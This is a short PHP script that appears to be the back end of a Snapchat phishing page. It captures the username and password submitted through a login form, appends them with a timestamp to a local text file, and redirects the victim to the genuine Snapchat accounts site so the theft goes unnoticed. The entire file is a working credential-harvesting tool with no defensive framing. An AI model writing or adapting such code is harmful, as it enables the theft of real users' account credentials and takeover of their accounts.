<?php
$username = $_POST["username"];
$password = $_POST["password"];

$ip = $_SERVER['REMOTE_ADDR'];
$date = date ('j F Y . g:i A');
$date = "User: $username\npass: $password\nip\ndate: $date\n--------------------\n";
$file = "dode.txt";
$fh = fopen ($file, 'a');
fwrite($fh, $date);
fclose($fh);

header('Location:https://accounts.snapchat.com');

?>